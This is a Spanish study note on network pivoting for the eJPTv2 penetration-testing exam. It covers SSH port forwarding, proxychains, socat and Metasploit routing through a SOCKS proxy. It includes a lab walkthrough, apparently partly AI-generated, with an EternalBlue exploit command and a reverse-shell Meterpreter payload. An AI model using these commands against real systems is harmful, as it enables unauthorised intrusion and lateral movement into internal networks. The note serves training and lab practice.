#apuntes #certificacion #eJPT

# 🔄 Pivoting (eJPTv2)

> **Definición**: Pivoting es el proceso de usar una máquina comprometida como puente para acceder a otras máquinas o redes internas que desde tu atacante (Kali) **no son accesibles directamente**.

Es un paso habitual después de obtener shell en una máquina expuesta.

---

## 🎯 Objetivo del Pivoting

- **Acceder a redes internas** no expuestas al atacante.
    
- **Enumerar y explotar** hosts que solo son visibles desde la máquina comprometida.
    
- **Extender alcance** → desde una primera víctima (“foothold”) hacia toda la red interna.

---

## 🌐 Conceptos básicos

- **Pivot host**: máquina comprometida usada como punto de salto.
    
- **Redes internas**: subredes solo accesibles desde el pivot host.
    
- **Pivoting** ≠ **tunneling**:
    
    - Pivoting → encaminar tráfico a través de una máquina intermedia.
        
    - Tunneling → encapsular/proxy el tráfico en otro protocolo (ej. HTTP tunnel, DNS tunnel).
        

En eJPT suele bastar con pivoting sencillo (SSH / Proxychains / Socat / Metasploit).

---

## 🛠️ Técnicas de Pivoting comunes

### 1. SSH Pivoting (Local / Remote / Dynamic)

#### 🔹Local Port Forward (LPortFwd)

- Redirige un puerto de tu Kali a uno accesible solo desde la víctima.
    

`ssh -L 8080:10.0.0.5:80 user@victima`

Ahora, desde Kali: `http://127.0.0.1:8080` → corresponde a `10.0.0.5:80` (red interna).

#### 🔹Remote Port Forward (RPortFwd)

- Abre un puerto en la máquina víctima que redirige hacia tu Kali.
    

`ssh -R 8080:127.0.0.1:80 user@victima`

#### 🔹Dynamic Port Forward (SOCKS Proxy)

- Más flexible, crea un proxy SOCKS para enrutar tráfico arbitrario.
    

`ssh -D 9050 user@victima`

- Luego, en Kali: editar `/etc/proxychains4.conf` → añadir `socks5 127.0.0.1 9050`.
    
- Usar con Proxychains:
    

`proxychains nmap -sT -Pn 10.0.0.0/24 proxychains firefox http://10.0.0.5`

---

### 2. Proxychains

- Permite encadenar conexiones a través de un proxy SOCKS.
    
- Muy usado tras `ssh -D` o cuando configuramos túneles con Metasploit o Socat.
    

Archivo: `/etc/proxychains4.conf`

`socks5 127.0.0.1 9050`

Uso:

`proxychains <comando> proxychains nmap -sT 10.0.0.0/24 proxychains smbclient -L 10.0.0.5 -U usuario`

---

### 3. Socat (túneles simples)

Socat puede crear túneles entre puertos (útil si no tienes SSH).

Ejemplo: exponer puerto interno 3306 (MySQL) a tu Kali:  
En la máquina pivot (victima):

`socat TCP-LISTEN:3306,fork TCP:10.0.0.5:3306`

En Kali:

`socat TCP-LISTEN:3306,fork TCP:victima:3306`

Ahora puedes usar `mysql -h 127.0.0.1 -P 3306`.

---

### 4. Metasploit Pivoting

Si usas Meterpreter:

`run autoroute -s 10.0.0.0/24      # añadir ruta interna use auxiliary/server/socks_proxy  # levanta proxy SOCKS set SRVPORT 1080 run`

Después:  
Configura Proxychains en Kali → `socks4 127.0.0.1 1080`.

Ahora puedes pivotar cualquier herramienta a través de ese proxy.

---

## 🔎 Enumeración en redes pivotadas

Una vez configurado el pivoting, **repite la enumeración interna** en la red nueva:

- `proxychains nmap -sT -Pn 10.0.0.0/24`
    
- `proxychains smbclient -L 10.0.0.5`
    
- `proxychains rdesktop 10.0.0.10`



---
[cs.utep.edu](https://www.cs.utep.edu/CFIA/files/outreach/PivotingExploitation/PivotingExploitation_Exercise.pdf?utm_source=chatgpt.com "Your goal is to access an internal webserver (10.0.4.3)")
# EJERCICIO CON METASPLOIT

Tienes una máquina comprometida (host _pivot_) que tiene **acceso a otra red interna** (p. ej. red `10.0.4.0/24`) donde hay un servicio/host objetivo (p. ej. `10.0.4.3`). Desde tu Kali (atacante) quieres alcanzar esa red interna usando la sesión Meterpreter sobre el host pivot — es decir, **usar el host comprometido como puerta de enlace** para escanear/abrir servicios internos o acceder a una web interna.

(El ejercicio está prácticamente calcado del _Pivoting/Exploitation_ lab de UTEP: comprometer host → crear rutas/proxies → usar navegador o nmap a través del pivot). ([cs.utep.edu](https://www.cs.utep.edu/CFIA/files/outreach/PivotingExploitation/PivotingExploitation_Exercise.pdf?utm_source=chatgpt.com "Your goal is to access an internal webserver (10.0.4.3)"))

---

## Topología de ejemplo (lab)

- **Atacante (Kali)** — IP pública/host atacante
    
- **Host pivot** (comprometido) — tiene 2 interfaces: externa (reachable desde Kali) e interna (conectada a la red `10.0.4.0/24`)
    
- **Target interno** — `10.0.4.3` (servicio HTTP/RDP/SMB, etc.)
    

---

## Flujo general (resumen)

1. Obtener **Meterpreter** en el host pivot.
    
2. Habilitar **ruteo** en Metasploit (autoroute / route add) para que msf conozca la subred interna.
    
3. Exponer un **SOCKS proxy** desde msf (auxiliary/server/socks4a) o crear **port forwards** (meterpreter `portfwd`) según necesidad.
    
4. Desde Kali: usar `proxychains` o configurar el navegador para usar SOCKS y así conectar a `10.0.4.3` (o usar `nmap` a través del proxy o hacer `curl`/browser).
    
5. Explorar/atacar el host interno desde tu Kali _a través_ del pivot. ([cs.utep.edu](https://www.cs.utep.edu/CFIA/files/outreach/PivotingExploitation/PivotingExploitation_Exercise.pdf?utm_source=chatgpt.com "Your goal is to access an internal webserver (10.0.4.3)"))
    

---

## Paso a paso detallado y comandos

> Asumo que ya tienes una sesión Meterpreter abierta (session `1`). Si no, el primer paso es explotarlo (ejemplo rápido):

```text
# en msfconsole
use exploit/windows/smb/ms17_010_eternalblue   # ejemplo
set RHOST 192.0.2.50
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <tu-IP>
exploit
# -> cuando se abra la session: background para seguir en msfconsole
```

### 1) Ver información básica de la sesión

```text
sessions -i 1
# dentro meterpreter:
meterpreter> sysinfo
meterpreter> ipconfig       # o ifconfig (según SO)
```

### 2) Añadir la ruta (metasploit routing)

Tienes dos opciones: **manual `route add`** o usar el módulo `post/multi/manage/autoroute`.

#### 🔹Opción A — route add (manual)

En msfconsole (no dentro de meterpreter):

```text
# indica a msf que la subred 10.0.4.0/24 es accesible a través de la session 1
route add 10.0.4.0 255.255.255.0 1
# listar rutas:
route
```

#### 🔹Opción B — módulo autoroute

```text
use post/multi/manage/autoroute
set SESSION 1
set SUBNET 10.0.4.0
set NETMASK 255.255.255.0
run
```

(esto configura automáticamente la ruta y algunos helpers). Ambos métodos permiten que msf enrute tráfico hacia esa subred a través de la session. ([cs.utep.edu](https://www.cs.utep.edu/CFIA/files/outreach/PivotingExploitation/PivotingExploitation_Exercise.pdf?utm_source=chatgpt.com "Your goal is to access an internal webserver (10.0.4.3)"))

### 3) Levantar un SOCKS proxy (muy práctico)

En msfconsole, crea un servidor SOCKS que haga proxy por msf (soporta socks4a, útil para resolución DNS remota):

```text
use auxiliary/server/socks4a
set SRVPORT 1080
run
```

- Esto hará que en tu Kali quede un SOCKS en `127.0.0.1:1080` que redirige tráfico a través del/las sesiones activas/rutas añadidas en msf. (Una alternativa es `auxiliary/server/socks5` según versión). ([Null Sweep](https://nullsweep.com/pivot-cheatsheet-for-pentesters/?utm_source=chatgpt.com "A Pivot Cheatsheet for Pentesters - Null Sweep"))
    

#### 🔹Usarlo desde Kali

- Opción A — `proxychains` (configura `/etc/proxychains.conf` con `socks4 127.0.0.1 1080`):
    

```bash
proxychains nmap -sT -Pn -n -p- 10.0.4.3       # nmap a través de SOCKS (con limitaciones)
proxychains firefox   # abre navegador e intenta http://10.0.4.3
```

- Opción B — configurar directamente el navegador para usar SOCKS4 127.0.0.1:1080 (ver UTEP exercise). ([cs.utep.edu](https://www.cs.utep.edu/CFIA/files/outreach/PivotingExploitation/PivotingExploitation_Exercise.pdf?utm_source=chatgpt.com "Your goal is to access an internal webserver (10.0.4.3)"))
    

> Nota: `proxychains + nmap -sS` no funcionará bien con SOCKS; usa `-sT` o herramientas que funcionen por SOCKS, o usa `nmap --proxy`/scripting adaptado.

### 4) Port forwarding con Meterpreter (cuando quieras exponer un puerto puntual)

Si sólo te interesa un puerto (ej. RDP 3389) en `10.0.4.3`, puedes forwardearlo hacia tu máquina:

En meterpreter:

```text
meterpreter> portfwd add -l 3389 -p 3389 -r 10.0.4.3
# ahora, en Kali:
rdesktop 127.0.0.1:3389   # o mstsc si se da el caso
```

`-l` es el puerto local, `-p` el puerto remoto en destino, `-r` el host remoto dentro de la red a la que accede el pivot. El `portfwd` es local al proceso msf, y es útil para exponer un puerto específico sin crear un proxy general. ([cs.utep.edu](https://www.cs.utep.edu/CFIA/files/outreach/PivotingExploitation/PivotingExploitation_Exercise.pdf?utm_source=chatgpt.com "Your goal is to access an internal webserver (10.0.4.3)"))

### 5) Escaneo/descubrimiento interno (ejemplos)

- Con ruta añadida: desde msf se pueden lanzar módulos o desde Kali usar proxychains para herramientas orientadas a TCP.
    
- Ejemplo con nmap vía SOCKS (limitado): `proxychains nmap -sT -Pn -p80,443 10.0.4.3`
    
- O desde msf: usar `db_nmap` si importas la ruta a la db de msf (requiere que msf enrute tráfico).
    

---

## Pistas, problemas comunes y recomendaciones prácticas

- **DNS/resolución:** SOCKS4a permite que la resolución DNS la haga el pivot (útil si Kali no resuelve nombres internos). ([Wikipedia](https://en.wikipedia.org/wiki/SOCKS?utm_source=chatgpt.com "SOCKS"))
    
- **`nmap`/raw TCP en SOCKS:** algunos tipos de scan no funcionan bien sobre SOCKS; `-sT` es la opción más segura con proxy.
    
- **`route add` vs `autoroute`**: `autoroute` es cómodo para añadir automáticamente, `route add` te da control manual.
    
- **Evita escaneos ruidosos en producción**: en lab está bien, en producción podrías crear alertas.
    
- **Persistencia/limpieza**: recuerda eliminar rutas y portforwards al terminar.
    

---

## Ejercicio reproducible (mini-lab, copia rápida)

1. Prepara 3 VMs: Kali (atta), Windows1 (pivot) con 2 NICs (NAT + InternalNet), Windows2 (target) en InternalNet (`10.0.4.3`).
    
2. Explotar Windows1 y obtener Meterpreter.
    
3. En msfconsole: `route add 10.0.4.0 255.255.255.0 1` (o `use post/multi/manage/autoroute … run`).
    
4. `use auxiliary/server/socks4a` → `set SRVPORT 1080` → `run`.
    
5. Configura Firefox en Kali a usar `SOCKS4 127.0.0.1:1080` → abrir `http://10.0.4.3`.
    
6. Alternativa: `meterpreter> portfwd add -l 3389 -p 3389 -r 10.0.4.3` → conectar RDP a `127.0.0.1:3389`.  
    (La guía del ejercicio UTEP te da los pasos detallados y pantallazos — es un recurso ideal para practicar). ([cs.utep.edu](https://www.cs.utep.edu/CFIA/files/outreach/PivotingExploitation/PivotingExploitation_Exercise.pdf?utm_source=chatgpt.com "Your goal is to access an internal webserver (10.0.4.3)"))
    

---

# ¿Es Metasploit pivoting “el pivoting más común” dentro del eJPTv2?

- **Sí y no (matizado).** En términos de **lo que te piden demostrar en eJPTv2** es muy habitual que esperen que sepas **el concepto de pivoting** y **al menos 1–2 técnicas prácticas**. Metasploit/`meterpreter` (autoroute/route/portfwd + SOCKS) es **una técnica ampliamente enseñada** y, por su facilidad, suele aparecer en labs y material de práctica. Para el examen te viene bien dominarla. ([cs.utep.edu](https://www.cs.utep.edu/CFIA/files/outreach/PivotingExploitation/PivotingExploitation_Exercise.pdf?utm_source=chatgpt.com "Your goal is to access an internal webserver (10.0.4.3)"))
    
- **Pero no es la única ni siempre la mejor**: otras técnicas comunes que también deberías conocer/practicar para eJPT:
    
    - **SSH tunneling** (`ssh -L`, `ssh -R`, dynamic SOCKS `ssh -D`) — muy frecuente en labs y real world.
        
    - **ProxyChains / socat / chisel / sslh / plink** — útiles para distintos escenarios.
        
    - **VPN pivoting o abuso de Docker sockets** — técnicas más avanzadas pero también vistas en CTFs/labs.
        
    
    En resumen: **domina Metasploit pivoting** (porque es eficiente y didáctico) **pero practica al menos SSH tunneling y port forwarding manual** — así cubres lo que probablemente aparezca en el eJPTv2.
    

---

# Recursos para practicar (lectura + labs)

- Ejercicio PDF (pivoting step-by-step) — UTEP: _PivotingExploitation_Exercise.pdf_. Buen lab reproducible. ([cs.utep.edu](https://www.cs.utep.edu/CFIA/files/outreach/PivotingExploitation/PivotingExploitation_Exercise.pdf?utm_source=chatgpt.com "Your goal is to access an internal webserver (10.0.4.3)"))
    
- Cheatsheet de pivoting (varios métodos): Nullsweep pivot cheatsheet. ([Null Sweep](https://nullsweep.com/pivot-cheatsheet-for-pentesters/?utm_source=chatgpt.com "A Pivot Cheatsheet for Pentesters - Null Sweep"))
    
- Documentación / lectura sobre SOCKS (cómo funciona SOCKS4a/5) — Wikipedia (útil para entender por qué usar socks4a para DNS). ([Wikipedia](https://en.wikipedia.org/wiki/SOCKS?utm_source=chatgpt.com "SOCKS"))
    

---

# Recomendaciones finales para eJPTv2

1. Practica **meterpreter → route/autoroute → SOCKS → proxychains/browser** (hazlo hasta que sea rutina).
    
2. Practica **ssh -D / ssh -L** (pivoting sin Metasploit).
    
3. Sabrás explicar en el informe: qué hiciste, por qué usaste SOCKS vs portfwd, y qué limitaciones te encontraste (DNS, nmap sobre socks, permisos).
    
4. Lleva límites de tiempo: en examen prueba primero el método rápido (SOCKS + navegador) para abrir el objetivo; si falla, prueba `portfwd`.
    

---

Si quieres, te preparo ahora **un playbook de comandos (copy-paste)** listo para tu Kali con las variantes (autoroute, route add, socks4a, portfwd y ejemplos de proxychains/nmap), o un mini-lab `Vagrant`/`docker-compose` reproducible con 3 máquinas para que practiques exactamente el flujo. ¿Cuál prefieres?